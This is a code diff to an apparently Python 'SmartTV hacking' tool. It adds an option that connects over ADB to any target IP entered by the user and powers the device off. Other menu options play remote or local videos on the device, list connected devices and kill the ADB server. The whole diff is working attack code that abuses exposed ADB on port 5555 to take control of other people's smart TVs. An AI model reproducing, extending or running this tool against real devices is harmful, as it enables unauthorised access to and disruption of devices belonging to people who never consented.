@@ -47,9 +47,10 @@ def main():
     print(f"{Fore.YELLOW}{Style.BRIGHT}      SmartTV hacking screen for need port(5555) open!\n")
     print(f"{Fore.YELLOW}{Style.BRIGHT}      [1] Execute Remote MP4 format")
     print(f"{Fore.YELLOW}{Style.BRIGHT}      [2] Execute Local MP4 format")
-    print(f"{Fore.YELLOW}{Style.BRIGHT}      [3] Power off")
-    print(f"{Fore.YELLOW}{Style.BRIGHT}      [4] Devices list")
-    print(f"{Fore.YELLOW}{Style.BRIGHT}      [5] Kill devices")
+    print(f"{Fore.YELLOW}{Style.BRIGHT}      [3] Remote Power off")
+    print(f"{Fore.YELLOW}{Style.BRIGHT}      [4] Local Power off")
+    print(f"{Fore.YELLOW}{Style.BRIGHT}      [5] Devices list")
+    print(f"{Fore.YELLOW}{Style.BRIGHT}      [6] Kill devices")
     print(f"{Fore.YELLOW}{Style.BRIGHT}\n               [99] Exit     [98] Requirements install\n")
 
     selection = input(f"{Fore.YELLOW}{Style.BRIGHT} [*] selection: ")
@@ -105,6 +106,23 @@ def main():
                 print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {connect_output.strip()} {connect_error.strip()}")
 
     elif selection == "3":
+        targetip = input(f"{Fore.YELLOW}{Style.BRIGHT} [*] Target IP: ")
+        if targetip:
+            connect_code, connect_output, connect_error = execute_command(["adb", "connect", targetip])
+            if connect_code == 0 and "unable to connect" not in connect_output.lower() and "cannot connect to" not in connect_error.lower():
+                print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Connecting..")
+                print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Connected!")
+                power_off_code, power_off_output, power_off_error = execute_command(["adb", "shell", "reboot", "-p"])
+                if power_off_code == 0:
+                    print(f"{Fore.YELLOW}{Style.BRIGHT} [+] Powering off!")
+                else:
+                    print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error powering off")
+                    print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {power_off_error.strip()}")
+            else:
+                print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error connecting to the device, please make sure ADB is installed and the device is accessible")
+                print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {connect_output.strip()} {connect_error.strip()}")
+
+    elif selection == "4":
         targetip = scan_and_select_device()
         if targetip:
             connect_code, connect_output, connect_error = execute_command(["adb", "connect", targetip])
@@ -121,7 +139,7 @@ def main():
                 print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error connecting to the device, please make sure ADB is installed and the device is accessible")
                 print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {connect_output.strip()} {connect_error.strip()}")
 
-    elif selection == "4":
+    elif selection == "5":
         print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Listing connected devices...")
         devices_code, devices_output, devices_error = execute_command(["adb", "devices"])
         if devices_code == 0:
@@ -130,7 +148,7 @@ def main():
             print(f"{Fore.YELLOW}{Style.BRIGHT} [-] Error listing devices")
             print(f"{Fore.YELLOW}{Style.BRIGHT} [!] ADB output: {devices_error.strip()}")
 
-    elif selection == "5":
+    elif selection == "6":
         print(f"{Fore.YELLOW}{Style.BRIGHT} [*] Killing..")
         kill_code, kill_output, kill_error = execute_command(["adb", "kill-server"])
 
